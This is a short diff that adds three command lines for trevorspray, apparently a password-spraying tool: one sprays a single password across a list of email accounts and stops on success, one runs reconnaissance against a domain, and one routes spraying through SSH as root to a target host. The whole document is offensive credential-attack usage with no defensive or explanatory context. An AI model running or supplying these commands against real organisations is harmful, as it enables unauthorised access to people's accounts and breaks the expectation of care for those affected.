@@ -1,0 +1,3 @@
+trevorspray -u emails.txt -p $PASSWORD --exit-on-success
+trevorspray --recon $DOMAIN -u emails.txt --threads 10
+trevorspray -u emails.txt -p $PASSWORD --ssh root@$TARGET
